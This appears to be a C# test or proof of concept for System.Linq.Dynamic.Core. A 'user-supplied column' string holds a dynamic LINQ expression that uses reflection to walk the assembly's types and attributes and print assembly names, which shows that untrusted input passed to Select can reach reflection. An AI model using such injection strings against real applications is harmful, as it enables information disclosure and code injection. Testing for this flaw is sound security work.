using System;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Dynamic.Core;
using System.Linq.Dynamic.Core.CustomTypeProviders;
using Microsoft.AspNetCore.Authorization;
using Newtonsoft.Json;

namespace ConsoleApp_net6._0;

public class TestClass
{
    public void TestIt()
    {
        var exploits = new List<Customer>
        {
            new()
            {
                Id = 1,
                Name = "abc"
            }
        };

        string userSuppliedColumn = @"
			c => string.Join(""\r\n"",
					c.GetType().Assembly.ExportedTypes
						.SelectMany(type => type.CustomAttributes)
						.Select(attr => attr.AttributeType.Assembly)
						.Select(assembly => assembly.FullName))
			";

        var config = new ParsingConfig
        {
            
        };

        foreach (var e in exploits.AsQueryable().Select<string>(config, userSuppliedColumn))
        {
            Console.WriteLine(e);
        }
    }

    public class Customer
    {
        public int Id { get; set; }
        public string Name { get; set; }
    }

    [Authorize]
    [JsonObject]
    public class SomeOtherType1
    {
    }

    [DynamicLinqType]
    public class SomeOtherType2
    {
    }
}